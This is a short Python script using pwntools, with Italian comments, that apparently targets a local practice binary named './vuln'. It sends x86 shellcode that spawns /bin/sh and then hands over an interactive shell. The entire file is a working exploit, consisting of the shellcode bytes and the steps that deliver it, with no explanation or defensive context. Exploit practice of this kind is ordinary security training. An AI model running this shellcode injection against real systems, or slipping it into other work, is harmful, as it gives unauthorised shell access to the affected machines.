from pwn import *

# Avvia il binario
p = process('./vuln')

# Shellcode che apre /bin/sh
shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")


# Invia lo shellcode
p.sendline(shellcode)

# Passa al terminale interattivo → da qui puoi digitare comandi nella shell
p.interactive()
